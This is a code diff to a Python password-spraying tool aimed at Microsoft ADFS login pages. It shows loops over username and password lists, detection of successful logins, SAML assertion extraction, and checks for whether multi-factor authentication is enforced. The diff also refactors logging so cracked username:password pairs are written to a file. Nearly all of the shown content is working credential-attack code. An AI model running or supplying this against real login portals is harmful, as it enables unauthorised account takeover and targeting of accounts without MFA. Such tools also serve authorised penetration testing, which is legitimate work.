@@ -4,6 +4,17 @@ import re
 import html
 import time
 from colorama import Fore, Style
+from datetime import datetime
+
+
+def log_message(message, log_file=None, color=None):
+    timestamp = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
+    if color:
+        print(f"[{timestamp}] {color}{message}{Style.RESET_ALL}")
+
+    if log_file:
+        with open(log_file, "a") as log:
+            log.write(f"[{timestamp}] {message}" + "\n")
 
 
 def extract_saml_assertion(response_content):
@@ -31,7 +42,7 @@ def send_login_request(
     target, username, password, verbose=False, log_file=None, check_mfa=False
 ):
     if verbose:
-        print(f"{Fore.WHITE}[*] Trying login for {username}{Style.RESET_ALL}", end="\r")
+        log_message(f"[*] Trying login for {username}", log_file, color=Fore.WHITE)
 
     payload = {
         "UserName": username,
@@ -57,11 +68,11 @@ def send_login_request(
                 'action="https://login.microsoftonline.com:443/login.srf"'
                 in adfs_login_response.text
             ):
-                success_message = f"[+] Login success: {username} : {password}"
-                print(f"{Fore.GREEN}{success_message}{Style.RESET_ALL}")
-                if log_file:
-                    with open(log_file, "a") as log:
-                        log.write(success_message + "\n")
+                log_message(
+                    f"[+] Login success: {username} : {password}",
+                    log_file,
+                    color=Fore.GREEN,
+                )
 
                 if check_mfa:
                     wresult_value = extract_saml_assertion(adfs_login_response.text)
@@ -82,29 +93,27 @@ def send_login_request(
 
                         if check_authentication_cookies(login_srf_response):
                             if check_mfa_string(login_srf_response):
-                                mfa_message = f"[-] MFA is required for: {username}"
-                                print(f"{Fore.YELLOW}{mfa_message}{Style.RESET_ALL}")
-                                if log_file:
-                                    log.write(mfa_message + "\n")
-                            elif not check_mfa_string(login_srf_response):
-                                mfa_message = f"[+] MFA is not required for: {username}"
-                                print(f"{Fore.GREEN}{mfa_message}{Style.RESET_ALL}")
-                                if log_file:
-                                    log.write(mfa_message + "\n")
+                                log_message(
+                                    f"[-] MFA required for: {username}",
+                                    log_file,
+                                    color=Fore.RED,
+                                )
                             else:
-                                print(
-                                    f"{Fore.RED}[!] Unknown error checking MFA.{Style.RESET_ALL}"
+                                log_message(
+                                    f"[+] MFA not required for: {username}",
+                                    log_file,
+                                    color=Fore.GREEN,
                                 )
                     else:
                         print(
-                            f"{Fore.RED}[!] Required data not found in the response.{Style.RESET_ALL}"
+                            f"{Fore.RED}[!] Unknown error checking MFA.{Style.RESET_ALL}"
                         )
             elif verbose:
-                failure_message = f"[-] Login failed: {username} : {password}"
-                print(f"{Fore.RED}{failure_message}{Style.RESET_ALL}")
-                if log_file:
-                    with open(log_file, "a") as log:
-                        log.write(failure_message + "\n")
+                log_message(
+                    f"[-] Login failed: {username} : {password}",
+                    log_file,
+                    color=Fore.RED,
+                )
 
     except requests.exceptions.Timeout:
         print(f"{Fore.RED}[!] Request timed out.{Style.RESET_ALL}")
@@ -120,18 +129,9 @@ if __name__ == "__main__":
         formatter_class=argparse.RawTextHelpFormatter,
         epilog="Usage examples:"
         "\n  python script.py -t https://adfs.example.com -u user -p password123"
-        "\n  python script.py -t https://adfs.example.com -U userlist.txt -p password123"
-        "\n  python script.py -t https://adfs.example.com -u user -P passwordlist.txt"
-        "\n  python script.py -t https://adfs.example.com -U userlist.txt -P passwordlist.txt"
-        "\n\nExplanation of flags:"
-        "\n  -t, --target [url]: ADFS target host URL (e.g., https://adfs.example.com)"
-        "\n  -u, --username [user]: Single username to try"
-        "\n  -U, --username-list [file]: File containing a list of usernames"
-        "\n  -p, --password [pass]: Single password to use for login attempts"
-        "\n  -P, --password-list [file]: File containing a list of passwords"
-        "\n  --mfa: Check if Multi-Factor Authentication (MFA) is required after successful login"
-        "\n  -v: Enable verbose mode"
-        "\n  -l [file]: File to log the login results"
+        "\n  python script.py -t https://adfs.example.com -U userlist.txt -p password123 --mfa"
+        "\n  python script.py -t https://adfs.example.com -u user -P passwordlist.txt -v -l output.txt"
+        "\n  python script.py -t https://adfs.example.com -U userlist.txt -P passwordlist.txt -d 2"
         "\n\nNote: Provide either a single password (-p) or a password list file (-P).\n",
     )
 
@@ -229,7 +229,7 @@ if __name__ == "__main__":
             )
             exit(1)
 
-    print(f"{Fore.CYAN}[*] Target ADFS Host: {target}{Style.RESET_ALL}")
+    log_message(f"[*] Target ADFS Host: {target}", log_file, color=Fore.CYAN)
 
     for username in usernames:
         for password in passwords:
